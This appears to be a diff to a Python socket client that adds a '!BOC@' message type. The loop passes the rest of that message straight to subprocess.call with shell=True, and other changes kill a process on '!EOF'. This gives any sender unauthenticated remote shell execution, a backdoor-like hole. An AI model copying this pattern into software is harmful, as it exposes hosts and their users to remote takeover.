@@ -10,7 +10,13 @@ while True:
 
             print(recv)
 
-            if len(recv.split("@")) == 3:
+            if len(recv.split("@")) == 2:
+                info = recv.split("@")
+
+                if info[0] == "!BOC":
+                    subprocess.call(info[1], shell=True)
+
+            elif len(recv.split("@")) == 3:
                 info = recv.split("@")
 
                 if info[0] == "!BOF":
@@ -26,6 +32,9 @@ while True:
                                 break
 
                     print("Received file.")
+                
+            if recv == "!EOF":
+                file_process.kill()
 
         else:
             break
